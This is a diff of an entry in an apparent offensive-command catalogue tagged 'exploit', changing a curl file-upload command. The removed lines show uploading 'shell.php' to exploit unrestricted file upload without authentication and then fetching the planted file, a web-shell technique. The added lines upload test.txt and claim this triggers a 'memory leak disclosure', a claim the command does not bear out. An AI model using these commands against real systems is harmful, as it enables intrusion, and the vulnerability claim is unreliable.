@@ -1,19 +1,22 @@
 ---
-id: cmd-curl-file-upload
-data: 'curl -X POST -F "file=@shell.php" https://mars.example.com/upload'
+id: cmd-uuid-placeholder-001
+data: >-
+  curl -X POST -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type:
+  multipart/form-data" -F "file=@test.txt"
+  https://target.com/talos/api/v1/files/upload
 tags:
-  - upload
   - web
+  - upload
   - exploit
 type: command
-output: Upload successful (HTTP 200 or similar response body)
+output: null
 executor: bash
 platforms:
   - Linux
   - macOS
   - Windows
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T05:32:13.616Z'
+updated_at: '2025-12-14T17:25:18.113Z'
 verified: false
 validated: true
 submitted: true
@@ -23,39 +26,41 @@ submitted: true
 ## Command
 
 ```bash
-curl -X POST -F "file=@shell.php" https://mars.example.com/upload
+curl -X POST -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: multipart/form-data" -F "file=@test.txt" https://target.com/talos/api/v1/files/upload
 ```
 
 ## Description
 
-This command uses curl to perform an HTTP POST multipart form upload of a local file to a target endpoint, exploiting unrestricted file upload vulnerabilities by sending arbitrary files without authentication.
+This command uploads a file to a web API endpoint using multipart form data, targeting the vulnerable file upload functionality to trigger memory leak disclosure.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X POST` | Specifies the HTTP method as POST | Yes |
-| `-F "file=@shell.php"` | Uploads the local file shell.php as form field 'file' | Yes |
-| `https://mars.example.com/upload` | Target upload endpoint URL | Yes |
+| `-X POST` | Specifies HTTP POST method | Yes |
+| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication header with Bearer token | Yes (if auth required) |
+| `-H "Content-Type: multipart/form-data"` | Sets content type for file upload | Yes |
+| `-F "file=@test.txt"` | Uploads the file specified by path | Yes |
+| `https://target.com/talos/api/v1/files/upload` | Target endpoint URL | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X POST -F "file=@shell.php" https://target.com/upload
+curl -X POST -F "file=@test.txt" https://target.com/talos/api/v1/files/upload
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -X POST -F "file=@shell.php" -F "description=test" https://target.com/upload --verbose
+curl -X POST -H "Authorization: Bearer abc123" -F "file=@test.txt" -v https://target.com/talos/api/v1/files/upload
 ```
 
 ## Expected Output
 
-A successful response like 'File uploaded successfully' or HTTP 200 status, without errors indicating validation failures. For verification, follow up with a GET request to access the file.
+JSON response indicating upload success, e.g., {"status": "success", "file_id": "123", "s3_url": "https://s3..."}. Verbose mode (-v) shows headers and any errors.
 
 ## Related
 
-- [[Related Procedure: Exploit-Unrestricted-File-Upload]]
+- [[Related Procedure: Exploit-File-Upload-Memory-Leak]]
